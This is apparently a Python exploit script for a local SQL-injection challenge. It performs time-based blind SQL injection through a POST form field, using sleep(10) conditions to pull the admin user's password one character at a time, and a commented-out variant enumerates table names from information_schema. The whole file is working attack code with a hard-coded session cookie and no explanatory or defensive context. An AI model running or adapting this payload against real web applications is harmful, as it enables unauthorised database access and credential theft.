import requests
import time
from ast import literal_eval

url = "http://localhost:81/sql-chall/chall2/home.php"
tableName= ""
cookies = {"PHPSESSID":"bupbihu03rj4u0llnnr5aojd64"}

for table in range(0,2):
	tableName += "\r\n"	
	for location in range(0,15):
		for character in range(48,127):
			characterHex = hex(character)[2:]
			#query = "'or if(hex(substr((select table_name from (select table_name from information_schema.tables where table_schema=database() limit "+str(table)+",1)as k),"+str(location)+",1))='"+str(characterHex)+"',sleep(10),0)  or'"
			query  = "'or if(hex(substr((select password from (select password from user where username='admin' limit "+str(table)+",1)as k),"+str(location)+",1))='"+str(characterHex)+"',sleep(10),0)  or'"
			startTime = time.time()
			request = requests.post(url=url,cookies=cookies,data={'title':query,'content':'gicungduoc',"post":"POST"})
			endTime = time.time() - startTime
			if endTime > 10:
				tableName += chr(literal_eval(hex(character)))
				print (tableName)
				break
			if location == 15:
				print ("\r\n")
			else:
				continue
				


